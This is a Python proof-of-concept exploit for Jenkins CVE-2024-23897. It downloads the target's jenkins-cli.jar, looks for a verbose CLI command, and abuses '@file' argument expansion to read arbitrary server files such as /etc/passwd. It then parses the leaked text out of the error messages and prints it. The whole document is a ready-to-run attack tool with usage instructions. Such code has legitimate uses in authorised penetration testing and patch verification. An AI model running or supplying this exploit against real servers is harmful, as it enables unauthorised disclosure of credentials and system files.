#!/usr/bin/env python3

import sys
import urllib.parse
import requests
from pathlib import Path
import subprocess


VERBOSE_COMMANDS = [
    "connect-node",
    "delete-job",
    "delete-node",
    "delete-view",
    "disconnect-node",
    "offline-node",
    "online-node",
    "reload-job",
]


def usage() -> None:
    print("""\
Usage: ./poc.py <url> <file>

Arguments:
    <url>     Target Jenkins URL (e.g. http://127.0.0.1:8080/)
    <file>    File path to read (e.g. /etc/passwd)

Example:
    ./poc.py http://127.0.0.1:8080/ /etc/passwd
""")
    sys.exit(1)


def banner() -> None:
    print("=" * 60)
    print("  Jenkins CVE-2024-23897 File Disclosure PoC")
    print("=" * 60)
    print()


def print_file(file: str, contents: str) -> None:
    print("-" * 60)
    print(f"[+] File Contents ({file})")
    print("-" * 60)
    print()
    print(contents)
    print()
    print("-" * 60)
    print(f"[+] Lines Retrieved: {len(contents.splitlines())}")
    print("=" * 60)


def no_file(reason: str) -> None:
    print("-" * 60)
    print("[-] File could not be retrieved.")
    print(f"[-] Reason: {reason}")
    print("-" * 60)
    sys.exit(1)


def process_output(file: str, leak: str) -> None:
    if "ERROR: No such file: " in leak:
        no_file("File does not exist or is inaccessible.")
    elif "ERROR: Failed to parse " in leak:
        no_file("Insufficient permissions to view file.")

    leak = leak.strip()
    if len(leak.splitlines()) == 1:
        leak = leak.removeprefix('ERROR: No such agent "')
        leak = leak.removesuffix('" exists.')
    else:
        leak = "\n".join(
            [
                i.split(': No such agent "')[0].strip()
                for i in leak.splitlines()
                if i.strip()
            ][:-1]
        )

    print_file(file, leak)


def main() -> None:
    banner()

    # extract scheme and netloc from provided url
    target = urllib.parse.urlparse(sys.argv[1])
    url = f"{target.scheme}://{target.netloc}"

    # extract provided file
    file = sys.argv[2]
    print(f"[+] Target:        {url}")
    print(f"[+] File:          {file}")

    req = requests.get(url)
    if req.status_code != 200:
        print(f"[-] Could not connect to {url}")
        print(f"[-] Exiting...")
        sys.exit(1)

    jar_path = Path("jenkins-cli.jar")
    if not jar_path.is_file():
        # attempt to download the jenkins-cli.jar file
        cli_url = f"{url}/jnlpJars/jenkins-cli.jar"
        req = requests.get(cli_url)
        if req.status_code != 200:
            print(f"[-] CLI retrieval failed. Could not connect to {cli_url}")
            print(f"[-] Exiting...")
            sys.exit(1)
        print(f"[+] CLI Retrieved: {cli_url}")

        # write the jarfile to disc
        with open("jenkins-cli.jar", "wb") as f:
            f.write(req.content)
    else:
        print(f"[+] CLI Retrieved: {jar_path}")

    jar_path = str(jar_path)

    # get a list of commands so we can compare with our known list of VERBOSE_COMMANDS
    proc = subprocess.run(
        ["java", "-jar", jar_path, "-s", url, "help"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    commands = [
        i.strip() for i in proc.stdout.splitlines() if i.strip() in VERBOSE_COMMANDS
    ]
    if not len(commands):
        print(f"[-] Verbose Cmd:   Not found via jenkins-cli.jar")
        print(f"[-] Exiting...")
        sys.exit(1)
    print(f"[+] Verbose Cmd:   {commands[0]}\n")

    # perform file read exploit
    proc = subprocess.run(
        ["java", "-jar", jar_path, "-s", url, commands[0], f"@{file}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    # parse output for file contents and print contents
    process_output(file, proc.stdout)

    sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        usage()

    main()
